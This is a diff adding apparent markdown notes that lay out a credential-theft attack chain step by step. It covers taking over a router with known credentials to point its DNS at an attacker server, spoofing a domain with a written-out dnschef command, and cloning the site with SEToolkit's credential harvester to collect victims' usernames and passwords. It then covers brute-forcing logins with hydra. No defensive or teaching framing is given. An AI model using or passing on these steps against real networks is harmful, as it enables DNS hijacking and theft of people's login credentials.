@@ -1,0 +1,26 @@
+1. Once you have the username and password of a router
+    - Go to router homepage using it's IP 'http://192.168.1.1'
+    - It will open router settings page
+    - Go to DNS settings. It is under different name for different routers
+    - Change the 'DNS relay' to 'User discovered DNS servers'
+    - Give your server's IP as primary DNS server
+    - Give '8.8.8.8' as secondary DNS server. It is Google dns server.
+    - When primary DNS is not available, then secondary DNS will work
+    - This will route all the network traffic through your server for DNS resolution
+2. DNS chef and SEToolkit
+    - `dnschef --fakeip=192.168.1.21 --fakedomains=randomDomain.com --interface=192.168.1.21`
+        - --fakeip : IP of your system where fake server is running
+        - --interface : interface that your system is using. use ifconfig to know
+    - `setoolkit` : it will open it's own shell
+        - Select 'Social engineering attacks'
+        - Select 'Website attack vectors'
+        - Select 'Creadential harvester method'
+        - Select 'Site cloner'
+        - Input your server's IP address
+        - Enter the domain name of website to clone 'randomDomain.com'
+3. Once both dns rerouting and website cloning step is done
+    - traffic is captured in file '/var/www/harvest*.txt'.
+    - It will display username and password if someone tried to login to the cloned website.
+4. Password guessing using hydra:
+    - Hydra takes a list of usernames and passwords and attempt to login using these Creadentials on the target website
+    - It is a brute force method to check for default Creadentials on any website.
